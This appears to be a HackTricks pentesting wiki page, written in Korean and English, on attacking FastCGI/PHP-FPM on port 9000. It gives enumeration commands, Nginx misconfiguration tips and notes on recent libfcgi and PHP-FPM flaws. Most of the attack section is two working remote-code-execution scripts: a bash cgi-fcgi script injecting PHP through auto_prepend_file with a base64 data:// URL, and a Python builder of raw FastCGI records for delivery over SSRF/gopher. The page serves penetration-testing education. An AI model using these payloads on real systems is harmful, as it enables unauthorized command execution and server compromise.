# 9000 Pentesting FastCGI

{{#include ../banners/hacktricks-training.md}}

## 기본 정보

If you want to **learn what is FastCGI** check the following page:


{{#ref}}
pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi.md
{{#endref}}

기본적으로 **FastCGI**는 **port** **9000**에서 동작하며 nmap에 의해 인식되지 않습니다. **보통** FastCGI는 **localhost**에서만 수신합니다.

## 열거 / 빠른 확인

* **Port scan:** `nmap -sV -p9000 <target>` (종종 "unknown" 서비스로 표시됩니다; 수동으로 테스트하세요).
* **Probe FPM status page:** `SCRIPT_FILENAME=/status SCRIPT_NAME=/status REQUEST_METHOD=GET cgi-fcgi -bind -connect 127.0.0.1:9000` (default php-fpm `pm.status_path`).
* **Find reachable sockets via SSRF:** HTTP 서비스가 SSRF에 취약한 경우 `gopher://127.0.0.1:9000/_...` payloads를 시도하여 FastCGI listener에 도달해보세요.
* **Nginx misconfigs:** `cgi.fix_pathinfo=1` with `fastcgi_split_path_info` 오류로 인해 정적 파일에 `/.php`를 추가하여 PHP에 도달할 수 있습니다 (code exec via traversal).

## RCE

FastCGI가 임의 코드를 실행하게 만드는 것은 비교적 쉽습니다:

<details>
<summary>PHP payload를 앞에 붙이는 FastCGI 요청 전송</summary>
```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
OUTPUT=$(mktemp)
env -i \
PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

cat $OUTPUT
done
```
</details>

또는 다음 python 스크립트를 사용할 수도 있습니다: [https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75](https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75)

### SSRF/gopher를 통한 FastCGI 접근 (9000 포트에 직접 접근할 수 없을 때)

만약 **SSRF** primitive만 제어할 수 있다면, gopher 스킴을 사용해 FastCGI에 접근하여 완전한 FastCGI 요청을 구성할 수 있습니다. 예시 payload builder:

<details>
<summary>gopher FastCGI RCE payload 빌드 및 전송</summary>
```python
import struct, socket
host, port = "127.0.0.1", 9000
params = {
b"REQUEST_METHOD": b"POST",
b"SCRIPT_FILENAME": b"/var/www/html/index.php",
b"PHP_VALUE": b"auto_prepend_file=php://input\nallow_url_include=1"
}
body = b"<?php system('id'); ?>"

def rec(rec_type, content, req_id=1):
return struct.pack("!BBHHBB", 1, rec_type, req_id, len(content), 0, 0) + content

def enc_params(d):
out = b""
for k, v in d.items():
out += struct.pack("!B", len(k)) + struct.pack("!B", len(v)) + k + v
return out
payload  = rec(4, enc_params(params)) + rec(4, b"")  # FCGI_PARAMS + terminator
payload += rec(5, body)                                # FCGI_STDIN

s = socket.create_connection((host, port))
s.sendall(payload)
print(s.recv(4096))
```
SSRF에서 `payload`를 URL-safe base64/percent-encoding으로 변환하여 `gopher://host:9000/_<payload>`로 전송하세요.
</details>

### 최근 이슈 관련 노트

* **libfcgi <= 2.4.4 integer overflow (2024):** FastCGI 레코드의 조작된 `nameLen`/`valueLen`이 32‑bit 빌드(embedded/IoT에서 흔함)에서 오버플로우를 일으켜, FastCGI 소켓에 접근 가능할 경우(직접 또는 SSRF를 통해) heap RCE를 유발할 수 있습니다.
* **PHP-FPM log manipulation (CVE-2024-9026):** `catch_workers_output = yes`로 설정된 경우, FastCGI 요청을 보낼 수 있는 공격자는 로그 라인당 최대 4바이트를 잘라내거나 주입하여 흔적을 지우거나 로그를 오염시킬 수 있습니다.
* **Classic Nginx + cgi.fix_pathinfo misconfig:** 여전히 널리 관찰됩니다. 파일 존재 검사 없이 `fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;`를 사용하면 `.php`로 끝나는 어떤 경로든 실행되어 path traversal 또는 source overwrite 스타일의 악용이 가능해집니다.



## 참조

* [FastCGI library integer overflow leading to RCE](https://cybersecuritynews.com/fastcgi-integer-overflow-flaw/)
* [CVE-2024-9026 PHP-FPM log manipulation analysis](https://cyrisk.com/security/cve-2024-9026-log-manipulation/)
{{#include ../banners/hacktricks-training.md}}
